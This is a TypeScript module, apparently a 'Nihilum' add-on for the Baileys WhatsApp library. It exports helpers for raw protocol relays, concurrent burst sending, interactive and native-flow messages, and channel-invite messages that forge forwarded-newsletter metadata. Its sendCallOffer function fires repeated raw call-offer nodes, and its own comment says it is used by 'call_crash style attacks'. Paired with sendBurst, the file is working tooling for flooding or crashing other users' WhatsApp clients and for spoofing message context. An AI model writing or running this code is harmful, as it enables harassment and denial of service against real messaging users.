/**
 * Paradox Nihilum foundation layer for Baileys
 * Opt-in helpers — normal bots (ParadoxGPT) keep stock behavior.
 */
import { generateWAMessageFromContent } from '../Utils'
import type { BinaryNode } from '../WABinary'

export type BurstTask = () => Promise<unknown>

export interface RelayRawOptions {
  messageId?: string
  additionalNodes?: any[]
  additionalAttributes?: Record<string, string>
  userJid?: string
}

export function bizInteractiveNodes(flowName = 'mixed'): any[] {
  return [
    {
      tag: 'biz',
      attrs: { actual_actors: '2', host_storage: '2' },
      content: [
        {
          tag: 'interactive',
          attrs: { type: 'native_flow', v: '1' },
          content: [{ tag: 'native_flow', attrs: { v: '9', name: flowName } }],
        },
      ],
    },
  ]
}

function resolveUserJid(sock: any, opts?: RelayRawOptions): string {
  return (
    opts?.userJid ||
    sock?.user?.id ||
    sock?.authState?.creds?.me?.id ||
    sock?.user?.jid ||
    ''
  )
}

export async function relayRaw(
  sock: any,
  jid: string,
  content: any,
  opts: RelayRawOptions = {}
) {
  const userJid = resolveUserJid(sock, opts)
  const full = generateWAMessageFromContent(jid, content, { userJid } as any)
  const messageId = opts.messageId || full.key.id
  await sock.relayMessage(jid, full.message!, {
    messageId,
    additionalNodes: opts.additionalNodes,
    additionalAttributes: opts.additionalAttributes,
  })
  return { key: { ...full.key, id: messageId }, message: full.message }
}

/** Fire-and-forget binary node (uses sock.sendNode) */
export async function sendNodeRaw(sock: any, node: BinaryNode) {
  if (typeof sock.sendNode !== 'function') {
    throw new Error('sendNode not available on socket')
  }
  return sock.sendNode(node)
}

export async function sendBurst(tasks: BurstTask[], concurrency = 8): Promise<void> {
  const queue = tasks.slice()
  const n = Math.min(Math.max(1, concurrency), queue.length || 1)
  await Promise.all(
    Array.from({ length: n }, async () => {
      while (queue.length) {
        const t = queue.shift()
        if (!t) break
        try {
          await t()
        } catch {
          /* per-task */
        }
      }
    })
  )
}

export interface SingleSelectRow {
  title: string
  description?: string
  rowId: string
}

export interface SingleSelectSection {
  title: string
  rows: SingleSelectRow[]
}

export async function sendSingleSelect(
  sock: any,
  jid: string,
  opts: {
    text: string
    title?: string
    footer?: string
    buttonText?: string
    sections: SingleSelectSection[]
    additionalNodes?: any[]
  }
) {
  try {
    return await sock.sendMessage(jid, {
      text: opts.text,
      title: opts.title,
      footer: opts.footer,
      buttonText: opts.buttonText || 'Select',
      sections: opts.sections,
    } as any)
  } catch {
    const buttonParamsJson = JSON.stringify({
      title: opts.title || 'Menu',
      sections: opts.sections.map((s) => ({
        title: s.title,
        rows: s.rows.map((r) => ({
          header: r.title,
          id: r.rowId,
          title: r.title,
          description: r.description || '',
        })),
      })),
    })
    return relayRaw(
      sock,
      jid,
      {
        interactiveMessage: {
          body: { text: opts.text },
          footer: opts.footer ? { text: opts.footer } : undefined,
          nativeFlowMessage: {
            buttons: [{ name: 'single_select', buttonParamsJson }],
            messageParamsJson: '{}',
          },
        },
      },
      { additionalNodes: opts.additionalNodes || bizInteractiveNodes('single_select') }
    )
  }
}

export async function sendNativeFlow(
  sock: any,
  jid: string,
  opts: {
    body: string
    footer?: string
    buttons: Array<{ name: string; buttonParamsJson: string }>
    messageParamsJson?: string
    flowName?: string
  }
) {
  return relayRaw(
    sock,
    jid,
    {
      interactiveMessage: {
        body: { text: opts.body },
        footer: opts.footer ? { text: opts.footer } : undefined,
        nativeFlowMessage: {
          buttons: opts.buttons,
          messageParamsJson: opts.messageParamsJson || '{}',
        },
      },
    },
    { additionalNodes: bizInteractiveNodes(opts.flowName || 'mixed') }
  )
}

export async function sendChannelInviteButton(
  sock: any,
  jid: string,
  opts: {
    body?: string
    newsletterJid: string
    newsletterName?: string
    inviteCode?: string
    displayText?: string
  }
) {
  const display = opts.displayText || 'View channel'
  const name = opts.newsletterName || 'Channel'
  const code = opts.inviteCode || ''
  const url = code
    ? `https://whatsapp.com/channel/${code}`
    : `https://whatsapp.com/channel/${String(opts.newsletterJid).replace('@newsletter', '')}`

  return relayRaw(
    sock,
    jid,
    {
      interactiveMessage: {
        body: { text: opts.body || name },
        nativeFlowMessage: {
          buttons: [
            {
              name: 'cta_url',
              buttonParamsJson: JSON.stringify({
                display_text: display,
                url,
                merchant_url: url,
              }),
            },
            {
              name: 'cta_copy',
              buttonParamsJson: JSON.stringify({
                display_text: 'Copy',
                copy_code: code || opts.newsletterJid,
              }),
            },
          ],
          messageParamsJson: JSON.stringify({
            newsletter_jid: opts.newsletterJid,
            newsletter_name: name,
            invite_code: code,
          }),
        },
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: opts.newsletterJid,
            newsletterName: name,
            serverMessageId: -1,
          },
        },
      },
    },
    { additionalNodes: bizInteractiveNodes('cta_url') }
  )
}

/**
 * Call offer IQ burst — used by call_crash style attacks.
 * Emits offer nodes; acceptance/UI is client-side. Not a VoIP stack.
 */
export async function sendCallOffer(
  sock: any,
  jid: string,
  opts: { callId?: string; video?: boolean; count?: number } = {}
) {
  const count = opts.count ?? 1
  const me = sock.user?.id || sock.authState?.creds?.me?.id || ''
  const results = []
  for (let i = 0; i < count; i++) {
    const callId = opts.callId || `${Date.now()}${i}`
    const node: BinaryNode = {
      tag: 'call',
      attrs: {
        to: jid,
        from: me,
        id: sock.generateMessageTag?.() || `${Date.now()}`,
      },
      content: [
        {
          tag: 'offer',
          attrs: {
            'call-id': callId,
            'call-creator': me,
          },
          content: opts.video
            ? [
                { tag: 'audio', attrs: { decibel: '0', rate: '8000' }, content: undefined },
                { tag: 'video', attrs: { decibel: '0', rate: '8000' }, content: undefined },
              ]
            : [{ tag: 'audio', attrs: { decibel: '0', rate: '8000' }, content: undefined }],
        },
      ],
    }
    try {
      await sendNodeRaw(sock, node)
      results.push({ ok: true, callId })
    } catch (e: any) {
      results.push({ ok: false, callId, error: e?.message })
    }
  }
  return results
}

export function attachNihilum(sock: any) {
  const api = {
    relayRaw: (jid: string, content: any, opts?: RelayRawOptions) => relayRaw(sock, jid, content, opts),
    sendNodeRaw: (node: BinaryNode) => sendNodeRaw(sock, node),
    sendBurst: (tasks: BurstTask[], concurrency?: number) => sendBurst(tasks, concurrency),
    sendSingleSelect: (jid: string, opts: Parameters<typeof sendSingleSelect>[2]) =>
      sendSingleSelect(sock, jid, opts),
    sendNativeFlow: (jid: string, opts: Parameters<typeof sendNativeFlow>[2]) =>
      sendNativeFlow(sock, jid, opts),
    sendChannelInviteButton: (jid: string, opts: Parameters<typeof sendChannelInviteButton>[2]) =>
      sendChannelInviteButton(sock, jid, opts),
    sendCallOffer: (jid: string, opts?: Parameters<typeof sendCallOffer>[2]) =>
      sendCallOffer(sock, jid, opts),
    bizInteractiveNodes,
  }
  sock.nihilum = api
  return sock
}

export const Nihilum = {
  relayRaw,
  sendNodeRaw,
  sendBurst,
  sendSingleSelect,
  sendNativeFlow,
  sendChannelInviteButton,
  sendCallOffer,
  bizInteractiveNodes,
  attachNihilum,
}

export default Nihilum
